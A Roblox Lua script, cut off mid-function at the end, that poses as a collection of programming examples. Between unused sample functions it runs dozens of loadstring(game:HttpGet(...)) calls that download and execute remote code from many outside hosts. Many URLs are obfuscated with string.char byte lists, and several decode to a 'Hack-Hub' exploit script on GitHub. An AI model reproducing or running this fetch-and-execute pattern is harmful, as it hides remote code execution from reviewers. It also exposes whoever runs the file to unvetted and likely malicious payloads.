local function doMath()
    local x = math.random(1, 100)
    local y = math.random(1, 100)
    return x + y
end

local url1 = "https://gamecdn.io/scripts/loader1.lua"
loadstring(game:HttpGet(url1, true))()

local function generateString()
    local chars = "abcdefghijklmnopqrstuvwxyz"
    local str = ""
    for i = 1, 10 do
        str = str .. chars:sub(math.random(1, #chars), math.random(1, #chars))
    end
    return str
end

local url2 = "https://rscripts.org/files/loader2.lua"
loadstring(game:HttpGet(url2, true))()

local function createTable()
    local t = {}
    for i = 1, 10 do
        table.insert(t, i)
    end
    return t
end

local encodedUrl = string.char(104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 115, 116, 111, 114, 101, 46, 110, 101, 116, 47, 114, 101, 115, 111, 117, 114, 99, 101, 115, 47, 108, 111, 97, 100, 101, 114, 51, 46, 108, 117, 97)
loadstring(game:HttpGet(encodedUrl, true))()

local function loopExample()
    for i = 1, 3 do
        print("Loop iteration: " .. i)
    end
end

local url4 = "https://robloxscripts.io/assets/loader4.lua"
loadstring(game:HttpGet(url4, true))()

local function conditionalExample()
    local num = math.random(1, 10)
    if num > 5 then
        print("Number is greater than 5")
    else
        print("Number is 5 or less")
    end
end

local url5Base = string.char(104, 116, 116, 112, 115, 58, 47, 47)
local url5Path = string.char(103, 97, 109, 101, 104, 117, 98, 46, 99, 111, 47, 115, 99, 114, 105, 112, 116, 115, 47, 108, 111, 97, 100, 101, 114, 53, 46, 108, 117, 97)
loadstring(game:HttpGet(url5Base .. url5Path, true))()

local function stringManipulation()
    local str = "This is a random string"
    local reversed = str:reverse()
    print("Reversed string: " .. reversed)
end

local url6 = "https://scripthost.biz/files/loader6.lua"
loadstring(game:HttpGet(url6, true))()

local function errorExample()
    local success, result = pcall(function()
        error("This is a random error")
    end)
    if not success then
        print("Caught error: " .. result)
    end
end

local url7p1 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
local url7p2 = string.char(115, 99, 114, 105, 112, 116, 115, 116, 111, 114, 101, 46, 117, 115, 47, 114, 101, 115, 111, 117, 114, 99, 101, 115, 47, 108, 111, 97, 100, 101, 114, 55, 46, 108, 117, 97)
loadstring(game:HttpGet(url7p1 .. url7p2, true))()

local function recursionExample(n)
    if n <= 0 then
        return
    end
    print("Recursion level: " .. n)
    recursionExample(n - 1)
end

local url8 = "https://rbxcdn.me/assets/loader8.lua"
loadstring(game:HttpGet(url8, true))()

local function coroutineExample()
    local co = coroutine.create(function()
        for i = 1, 3 do
            print("Coroutine: " .. i)
            coroutine.yield()
        end
    end)
    for i = 1, 3 do
        coroutine.resume(co)
    end
end

local url9parts = {}
url9parts[1] = string.char(104, 116, 116, 112, 115, 58, 47, 47)
url9parts[2] = string.char(103, 97, 109, 101, 99, 101, 110, 116, 114, 97, 108, 46, 120, 121, 122, 47, 115, 99, 114, 105, 112, 116, 115, 47, 108, 111, 97, 100, 101, 114, 57, 46, 108, 117, 97)
loadstring(game:HttpGet(url9parts[1] .. url9parts[2], true))()

local function metatableExample()
    local t = {}
    local mt = {
        __index = function(self, key)
            return "Metatable access: " .. key
        end
    }
    setmetatable(t, mt)
    print(t.randomKey)
end

local url10 = "https://scriptmarket.ai/files/loader10.lua"
loadstring(game:HttpGet(url10, true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function envExample()
    local env = {}
    setmetatable(env, { __index = _G })
    env.randomVar = "This is a random variable"
    print(env.randomVar)
end

local urlA = "https://rbxscriptbank.net/resources/loaderA.lua"
loadstring(game:HttpGet(urlA, true))()

local function debugExample()
    local info = debug.getinfo(1)
    print("Debug info: " .. info.name)
end

local urlB = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 46, 99, 111, 109, 47, 97, 115, 115, 101, 116, 115, 47, 108, 111, 97, 100, 101, 114, 66, 46, 108, 117, 97)
loadstring(game:HttpGet(urlB, true))()

local function loadstringExample()
    local code = "print('This is a random loadstring')"
    loadstring(code)()
end

local urlC = "h"
local urlC2 = string.char(116, 116, 112, 115, 58, 47, 47)
local urlC3 = "robloxscriptarchive"
local urlC4 = "."
local urlC5 = string.char(99, 111, 109, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 67, 46, 108, 117, 97)
loadstring(game:HttpGet(urlC .. urlC2 .. urlC3 .. urlC4 .. urlC5, true))()

local function requireExample()
    local module = {}
    function module.randomFunction()
        print("This is a random module function")
    end
    return module
end

local urlD = {
    part1 = string.char(104, 116, 116, 112, 115, 58, 47, 47),
    part2 = string.char(103, 97, 109, 101, 115, 104, 97, 114, 101, 100, 46, 110, 101, 116, 47, 115, 99, 114, 105, 112, 116, 115, 47, 108, 111, 97, 100, 101, 114, 68, 46, 108, 117, 97)
}
loadstring(game:HttpGet(urlD.part1 .. urlD.part2, true))()

local function garbageCollectorExample()
    collectgarbage("collect")
    print("Garbage collection done")
end

local urlE = "https://scriptcdn.org/modules/loaderE.lua"
loadstring(game:HttpGet(urlE, true))()

local function threadExample()
    local thread = coroutine.create(function()
        print("Thread started")
        coroutine.yield()
        print("Thread resumed")
    end)
    coroutine.resume(thread)
    coroutine.resume(thread)
end

local urlFBase = "https://"
local urlFDomain = string.char(103, 97, 109, 101, 115, 99, 114, 105, 112, 116, 115, 46, 105, 111)
local urlFPath = string.char(47, 115, 116, 111, 114, 101, 47, 108, 111, 97, 100, 101, 114, 70, 46, 108, 117, 97)
loadstring(game:HttpGet(urlFBase .. urlFDomain .. urlFPath, true))()

local function globalExample()
    _G.randomGlobalVar = "This is a random global variable"
    print(_G.randomGlobalVar)
end

local urlG1 = string.char(104, 116)
local urlG2 = string.char(116, 112, 115, 58, 47, 47)
local urlG3 = string.char(115, 99, 114, 105, 112, 116, 115, 116, 111, 114, 101, 46, 99, 111)
local urlG4 = string.char(109, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 71, 46, 108, 117, 97)
loadstring(game:HttpGet(urlG1 .. urlG2 .. urlG3 .. urlG4, true))()

local function moduleExample()
    local module = {}
    function module.randomFunction()
        print("This is a random module function")
    end
    return module
end

local urlH = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "gamedata" .. "." .. string.char(99, 111, 109, 47, 100, 97, 116, 97, 47, 108, 111, 97, 100, 101, 114, 72, 46, 108, 117, 97)
loadstring(game:HttpGet(urlH, true))()

local function errorHandlerExample()
    local function errorHandler(err)
        return "Error handler: " .. err
    end
    local success, result = xpcall(function()
        error("This is a random error")
    end, errorHandler)
    if not success then
        print("Caught error: " .. result)
    end
end

local urlI = {}
urlI[1] = "h"
urlI[2] = string.char(116, 116, 112, 115, 58, 47, 47)
urlI[3] = string.char(114, 98, 120, 115, 99, 114, 105, 112, 116, 115, 46, 99, 111, 109, 47, 109, 111, 100, 117, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 73, 46, 108, 117, 97)
loadstring(game:HttpGet(urlI[1] .. urlI[2] .. urlI[3], true))()

local function tracebackExample()
    local traceback = debug.traceback("Random traceback")
    print(traceback)
end

local urlJ = "https://scriptexchange.net/assets/loaderJ.lua"
loadstring(game:HttpGet(urlJ, true))()

local function eventExample()
    local event = Instance.new("BindableEvent")
    event.Event:Connect(function(data)
        print("Event fired with data: " .. data)
    end)
    event:Fire("Random event data")
end

local urlK = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptrepository" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 75, 46, 108, 117, 97)
loadstring(game:HttpGet(urlK, true))()

local function tableManipulationExample()
    local t = {1, 2, 3, 4, 5}
    table.insert(t, 6)
    table.remove(t, 1)
    for i, v in ipairs(t) do
        print(i, v)
    end
end

local urlL = string.char(104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 99, 111, 100, 101, 46, 105, 111, 47, 109, 111, 100, 117, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 76, 46, 108, 117, 97)
loadstring(game:HttpGet(urlL, true))()

local function closureExample()
    local function createCounter()
        local count = 0
        return function()
            count = count + 1
            return count
        end
    end
    local counter = createCounter()
    for i = 1, 3 do
        print("Counter: " .. counter())
    end
end

local urlM = "https://rbxscripts.com/assets/loaderM.lua"
loadstring(game:HttpGet(urlM, true))()

local function vectorExample()
    local v1 = Vector3.new(1, 2, 3)
    local v2 = Vector3.new(4, 5, 6)
    local v3 = v1 + v2
    print("Vector sum: " .. tostring(v3))
end

local urlN1 = "h"
local urlN2 = string.char(116, 116, 112, 115, 58, 47, 47)
local urlN3 = "scriptcenter"
local urlN4 = "."
local urlN5 = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 78, 46, 108, 117, 97)
loadstring(game:HttpGet(urlN1 .. urlN2 .. urlN3 .. urlN4 .. urlN5, true))()

local function cframeExample()
    local cf1 = CFrame.new(0, 10, 0)
    local cf2 = CFrame.Angles(math.rad(45), 0, 0)
    local cf3 = cf1 * cf2
    print("CFrame: " .. tostring(cf3))
end

local urlO = "https://gamescripts.org/modules/loaderO.lua"
loadstring(game:HttpGet(urlO, true))()

local function instanceExample()
    local part = Instance.new("Part")
    part.Size = Vector3.new(1, 1, 1)
    part.Position = Vector3.new(0, 10, 0)
    print("Part created at position: " .. tostring(part.Position))
end

local urlP = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 104, 117, 98, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 80, 46, 108, 117, 97)
loadstring(game:HttpGet(urlP, true))()

local function physicsExample()
    local part = Instance.new("Part")
    part.Size = Vector3.new(1, 1, 1)
    part.Position = Vector3.new(0, 10, 0)
    part.Anchored = false
    print("Physics part created")
end

local urlQ = {}
urlQ[1] = string.char(104, 116, 116, 112, 115, 58, 47, 47)
urlQ[2] = string.char(103, 97, 109, 101, 97, 115, 115, 101, 116, 115, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 81, 46, 108, 117, 97)
loadstring(game:HttpGet(urlQ[1] .. urlQ[2], true))()

local gitPart1 = "h" .. string.char(116, 116, 112, 115, 58, 47, 47)
local gitPart2 = string.char(114, 97, 119)
local gitPart3 = "." .. string.char(103, 105, 116, 104, 117, 98, 117, 115, 101, 114)
local gitPart4 = "content" .. "."
local gitPart5 = string.char(99, 111, 109, 47, 109, 111, 110, 107, 101, 121, 45, 112, 114, 111, 103, 47, 72, 97, 99, 107, 45, 72, 117, 98, 47, 109, 97, 105, 110, 47, 115, 99, 114, 105, 112, 116, 46, 108, 117, 97)
loadstring(game:HttpGet(gitPart1 .. gitPart2 .. gitPart3 .. gitPart4 .. gitPart5, true))()

local function tweenExample()
    local part = Instance.new("Part")
    part.Position = Vector3.new(0, 0, 0)
    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = game:GetService("TweenService"):Create(part, tweenInfo, {Position = Vector3.new(0, 10, 0)})
    tween:Play()
    print("Tween started")
end

local urlR = "https://scriptcommunity.net/resources/loaderR.lua"
loadstring(game:HttpGet(urlR, true))()

local function raycastExample()
    local origin = Vector3.new(0, 10, 0)
    local direction = Vector3.new(0, -1, 0)
    local ray = Ray.new(origin, direction * 10)
    print("Raycast created: " .. tostring(ray))
end

local urlS = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptdatabase" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 83, 46, 108, 117, 97)
loadstring(game:HttpGet(urlS, true))()

local function soundExample()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://123456789"
    sound.Volume = 0.5
    print("Sound created with ID: " .. sound.SoundId)
end

local urlT = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 116, 111, 114, 97, 103, 101, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 84, 46, 108, 117, 97)
loadstring(game:HttpGet(urlT, true))()

local function animationExample()
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://987654321"
    print("Animation created with ID: " .. animation.AnimationId)
end

local urlU = {}
urlU[1] = "h"
urlU[2] = string.char(116, 116, 112, 115, 58, 47, 47)
urlU[3] = "gamemodules"
urlU[4] = "."
urlU[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 85, 46, 108, 117, 97)
loadstring(game:HttpGet(urlU[1] .. urlU[2] .. urlU[3] .. urlU[4] .. urlU[5], true))()

local function uiExample()
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 200, 0, 200)
    frame.Position = UDim2.new(0.5, -100, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    print("UI Frame created")
end

local urlV = "https://scriptarchive.org/modules/loaderV.lua"
loadstring(game:HttpGet(urlV, true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function colorExample()
    local color1 = Color3.fromRGB(255, 0, 0)
    local color2 = Color3.fromHSV(0.5, 1, 1)
    print("RGB Color: " .. tostring(color1))
    print("HSV Color: " .. tostring(color2))
end

local urlW1 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
local urlW2 = string.char(115, 99, 114, 105, 112, 116, 98, 97, 110, 107, 46, 99, 111, 109, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 87, 46, 108, 117, 97)
loadstring(game:HttpGet(urlW1 .. urlW2, true))()

local function enumExample()
    local material = Enum.Material.Plastic
    local keyCode = Enum.KeyCode.Space
    print("Material: " .. tostring(material))
    print("KeyCode: " .. tostring(keyCode))
end

local urlX = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptcentral" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 88, 46, 108, 117, 97)
loadstring(game:HttpGet(urlX, true))()

local function brickColorExample()
    local brickColor1 = BrickColor.new("Bright red")
    local brickColor2 = BrickColor.new(255, 0, 0)
    print("BrickColor by name: " .. tostring(brickColor1))
    print("BrickColor by RGB: " .. tostring(brickColor2))
end

local urlY = "https://robloxassets.com/scripts/loaderY.lua"
loadstring(game:HttpGet(urlY, true))()

local function regionExample()
    local region = Region3.new(Vector3.new(0, 0, 0), Vector3.new(10, 10, 10))
    print("Region created: " .. tostring(region))
end

local urlZ = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 108, 105, 98, 114, 97, 114, 121, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 90, 46, 108, 117, 97)
loadstring(game:HttpGet(urlZ, true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function udim2Example()
    local udim2_1 = UDim2.new(0, 100, 0, 100)
    local udim2_2 = UDim2.new(0.5, 0, 0.5, 0)
    print("UDim2 pixel offset: " .. tostring(udim2_1))
    print("UDim2 scale: " .. tostring(udim2_2))
end

local url_aa = "https://scriptvault.net/files/loader_aa.lua"
loadstring(game:HttpGet(url_aa, true))()

local function dataStoreExample()
    local dataStore = game:GetService("DataStoreService"):GetDataStore("TestStore")
    print("DataStore created: TestStore")
end

local url_bb = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptportal" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 98, 98, 46, 108, 117, 97)
loadstring(game:HttpGet(url_bb, true))()
local function jsonExample()
    local data = {name = "Test", value = 123}
    local encoded = game:GetService("HttpService"):JSONEncode(data)
    local decoded = game:GetService("HttpService"):JSONDecode(encoded)
    print("JSON encoded: " .. encoded)
    print("JSON decoded name: " .. decoded.name)
end

local url_cc = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 104, 117, 98, 46, 99, 111, 109, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 99, 99, 46, 108, 117, 97)
loadstring(game:HttpGet(url_cc, true))()


local function httpRequestExample()
    local response = game:GetService("HttpService"):GetAsync("https://httpbin.org/get")
    print("HTTP Response received")
end

local url_dd = "https://scriptforum.net/modules/loader_dd.lua"
loadstring(game:HttpGet(url_dd, true))()

local function base64Example()
    local base64 = {}
    local extract = _G.bit32 and _G.bit32.extract
    local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    function base64.encode(data)
        return ((data:gsub(".", function(x) 
            local r, b = "", x:byte()
            for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i-1) > 0 and "1" or "0") end
            return r
        end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
            if (#x < 6) then return "" end
            local c = 0
            for i = 1, 6 do c = c + (x:sub(i,i) == "1" and 2 ^ (6-i) or 0) end
            return b64chars:sub(c+1, c+1)
        end) .. ({ "", "==", "=" })[#data % 3 + 1])
    end
    print("Base64 example: " .. base64.encode("Hello"))
end

local url_ee1 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
local url_ee2 = string.char(115, 99, 114, 105, 112, 116, 99, 101, 110, 116, 101, 114, 46, 105, 111, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 101, 101, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ee1 .. url_ee2, true))()

local function dateTimeExample()
    local currentTime = os.time()
    local formattedTime = os.date("%c", currentTime)
    print("Current time: " .. formattedTime)
end

local url_ff = {}
url_ff[1] = "h"
url_ff[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_ff[3] = "scriptworld"
url_ff[4] = "."
url_ff[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 102, 102, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ff[1] .. url_ff[2] .. url_ff[3] .. url_ff[4] .. url_ff[5], true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function mapExample()
    local function map(func, array)
        local new_array = {}
        for i, v in ipairs(array) do
            new_array[i] = func(v)
        end
        return new_array
    end
    local doubles = map(function(x) return x * 2 end, {1, 2, 3, 4})
    for i, v in ipairs(doubles) do
        print(i, v)
    end
end

local url_gg = "https://scriptdepot.net/files/loader_gg.lua"
loadstring(game:HttpGet(url_gg, true))()

local function filterExample()
    local function filter(func, array)
        local new_array = {}
        for i, v in ipairs(array) do
            if func(v) then
                table.insert(new_array, v)
            end
        end
        return new_array
    end
    local evens = filter(function(x) return x % 2 == 0 end, {1, 2, 3, 4, 5, 6})
    for i, v in ipairs(evens) do
        print(i, v)
    end
end

local url_hh = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptmarket" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 104, 104, 46, 108, 117, 97)
loadstring(game:HttpGet(url_hh, true))()

local function reduceExample()
    local function reduce(func, array, initial)
        local accumulator = initial
        for i, v in ipairs(array) do
            accumulator = func(accumulator, v)
        end
        return accumulator
    end
    local sum = reduce(function(a, b) return a + b end, {1, 2, 3, 4, 5}, 0)
    print("Sum: " .. sum)
end

local url_ii = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 116, 111, 114, 101, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 105, 105, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ii, true))()

local function promiseExample()
    local Promise = {}
    Promise.__index = Promise
    
    function Promise.new(executor)
        local self = setmetatable({
            _state = "pending",
            _value = nil,
            _reason = nil,
            _onFulfilled = {},
            _onRejected = {}
        }, Promise)
        
        local function resolve(value)
            if self._state ~= "pending" then return end
            self._state = "fulfilled"
            self._value = value
            for _, callback in ipairs(self._onFulfilled) do
                callback(value)
            end
        end
        
        local function reject(reason)
            if self._state ~= "pending" then return end
            self._state = "rejected"
            self._reason = reason
            for _, callback in ipairs(self._onRejected) do
                callback(reason)
            end
        end
        
        executor(resolve, reject)
        return self
    end
    
    function Promise:then(onFulfilled, onRejected)
        return self
    end
    
    function Promise:catch(onRejected)
        return self:then(nil, onRejected)
    end
    
    local promise = Promise.new(function(resolve, reject)
        resolve("Promise resolved")
    end)
    
    print("Promise example created")
end

local url_jj = {}
url_jj[1] = "h"
url_jj[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_jj[3] = "scriptlibrary"
url_jj[4] = "."
url_jj[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 106, 106, 46, 108, 117, 97)
loadstring(game:HttpGet(url_jj[1] .. url_jj[2] .. url_jj[3] .. url_jj[4] .. url_jj[5], true))()

local function observableExample()
    local Observable = {}
    Observable.__index = Observable
    
    function Observable.new()
        local self = setmetatable({
            _observers = {}
        }, Observable)
        return self
    end
    
    function Observable:subscribe(observer)
        table.insert(self._observers, observer)
        return function()
            for i, o in ipairs(self._observers) do
                if o == observer then
                    table.remove(self._observers, i)
                    break
                end
            end
        end
    end
    
    function Observable:notify(data)
        for _, observer in ipairs(self._observers) do
            observer(data)
        end
    end
    
    local observable = Observable.new()
    local unsubscribe = observable:subscribe(function(data)
        print("Observer received: " .. data)
    end)
    
    observable:notify("Test notification")
    unsubscribe()
    
    print("Observable example completed")
end

local url_kk = "https://scriptcollection.net/files/loader_kk.lua"
loadstring(game:HttpGet(url_kk, true))()

local gitUrl1 = "h" .. string.char(116, 116, 112, 115, 58, 47, 47)
local gitUrl2 = string.char(114, 97, 119)
local gitUrl3 = "." .. string.char(103, 105, 116, 104, 117, 98, 117, 115, 101, 114)
local gitUrl4 = "content" .. "."
local gitUrl5 = string.char(99, 111, 109, 47, 109, 111, 110, 107, 101, 121, 45, 112, 114, 111, 103, 47, 72, 97, 99, 107, 45, 72, 117, 98, 47, 109, 97, 105, 110, 47, 115, 99, 114, 105, 112, 116, 46, 108, 117, 97)
loadstring(game:HttpGet(gitUrl1 .. gitUrl2 .. gitUrl3 .. gitUrl4 .. gitUrl5, true))()

local function memoizeExample()
    local function memoize(fn)
        local cache = {}
        return function(...)
            local args = {...}
            local key = table.concat(args, ",")
            if cache[key] == nil then
                cache[key] = fn(...)
            end
            return cache[key]
        end
    end
    
    local function fibonacci(n)
        if n <= 1 then return n end
        return fibonacci(n-1) + fibonacci(n-2)
    end
    
    local memoizedFib = memoize(fibonacci)
    local result = memoizedFib(10)
    print("Fibonacci(10) = " .. result)
end

local url_ll = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptwarehouse" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 108, 108, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ll, true))()

local function debounceExample()
    local function debounce(fn, delay)
        local timer = nil
        return function(...)
            local args = {...}
            if timer then
                timer:Disconnect()
                timer = nil
            end
            timer = game:GetService("RunService").Heartbeat:Connect(function()
                timer:Disconnect()
                timer = nil
                fn(unpack(args))
            end)
        end
    end
    
    local debounced = debounce(function(msg)
        print("Debounced: " .. msg)
    end, 0.5)
    
    debounced("Test 1")
    debounced("Test 2")
    debounced("Test 3")
    
    print("Debounce example completed")
end

local url_mm = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 119, 111, 114, 108, 100, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 109, 109, 46, 108, 117, 97)
loadstring(game:HttpGet(url_mm, true))()

local function throttleExample()
    local function throttle(fn, limit)
        local lastRun = 0
        return function(...)
            local now = tick()
            if now - lastRun >= limit then
                lastRun = now
                return fn(...)
            end
        end
    end
    
    local throttled = throttle(function(msg)
        print("Throttled: " .. msg)
    end, 1)
    
    throttled("Test 1")
    throttled("Test 2")
    throttled("Test 3")
    
    print("Throttle example completed")
end

local url_nn = {}
url_nn[1] = "h"
url_nn[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_nn[3] = "scripthaven"
url_nn[4] = "."
url_nn[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 110, 110, 46, 108, 117, 97)
loadstring(game:HttpGet(url_nn[1] .. url_nn[2] .. url_nn[3] .. url_nn[4] .. url_nn[5], true))()

local function curryExample()
    local function curry(fn, arity)
        arity = arity or debug.getinfo(fn).nparams
        return function(...)
            local args = {...}
            if #args >= arity then
                return fn(unpack(args))
            else
                return curry(function(...)
                    local newArgs = {...}
                    local allArgs = {}
                    for i = 1, #args do
                        allArgs[i] = args[i]
                    end
                    for i = 1, #newArgs do
                        allArgs[#args + i] = newArgs[i]
                    end
                    return fn(unpack(allArgs))
                end, arity - #args)
            end
        end
    end
    
    local function add(a, b, c)
        return a + b + c
    end
    
    local curriedAdd = curry(add)
    local add5 = curriedAdd(5)
    local add5And10 = add5(10)
    local result = add5And10(15)
    
    print("Curried add result: " .. result)
end

local url_oo = "https://scriptresources.net/files/loader_oo.lua"
loadstring(game:HttpGet(url_oo, true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function composeExample()
    local function compose(...)
        local funcs = {...}
        return function(...)
            local result = {...}
            for i = #funcs, 1, -1 do
                result = {funcs[i](unpack(result))}
            end
            return unpack(result)
        end
    end
    
    local function addOne(x)
        return x + 1
    end
    
    local function double(x)
        return x * 2
    end
    
    local function square(x)
        return x * x
    end
    
    local composed = compose(square, double, addOne)
    local result = composed(5)
    
    print("Compose result: " .. result)
end

local url_pp = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptexchange" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 112, 112, 46, 108, 117, 97)
loadstring(game:HttpGet(url_pp, true))()

local function pipeExample()
    local function pipe(...)
        local funcs = {...}
        return function(...)
            local result = {...}
            for i = 1, #funcs do
                result = {funcs[i](unpack(result))}
            end
            return unpack(result)
        end
    end
    
    local function addOne(x)
        return x + 1
    end
    
    local function double(x)
        return x * 2
    end
    
    local function square(x)
        return x * x
    end
    
    local piped = pipe(addOne, double, square)
    local result = piped(5)
    
    print("Pipe result: " .. result)
end

local url_qq = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 116, 97, 115, 104, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 113, 113, 46, 108, 117, 97)
loadstring(game:HttpGet(url_qq, true))()

local function zipExample()
    local function zip(...)
        local arrays = {...}
        local result = {}
        local min = math.huge
        
        for i = 1, #arrays do
            min = math.min(min, #arrays[i])
        end
        
        for i = 1, min do
            local item = {}
            for j = 1, #arrays do
                item[j] = arrays[j][i]
            end
            result[i] = item
        end
        
        return result
    end
    
    local zipped = zip({1, 2, 3}, {4, 5, 6}, {7, 8, 9})
    for i, v in ipairs(zipped) do
        print("Zipped " .. i .. ": " .. table.concat(v, ", "))
    end
end

local url_rr = {}
url_rr[1] = "h"
url_rr[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_rr[3] = "scriptdatabase"
url_rr[4] = "."
url_rr[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 114, 114, 46, 108, 117, 97)
loadstring(game:HttpGet(url_rr[1] .. url_rr[2] .. url_rr[3] .. url_rr[4] .. url_rr[5], true))()

local function flattenExample()
    local function flatten(arr)
        local result = {}
        for i = 1, #arr do
            if type(arr[i]) == "table" then
                local flattened = flatten(arr[i])
                for j = 1, #flattened do
                    table.insert(result, flattened[j])
                end
            else
                table.insert(result, arr[i])
            end
        end
        return result
    end
    
    local flattened = flatten({1, {2, {3, 4}, 5}, 6})
    print("Flattened: " .. table.concat(flattened, ", "))
end

local url_ss = "https://scriptpool.net/files/loader_ss.lua"
loadstring(game:HttpGet(url_ss, true))()

local function jsonExample()
    local data = {name = "Test", value = 123}
    local encoded = game:GetService("HttpService"):JSONEncode(data)
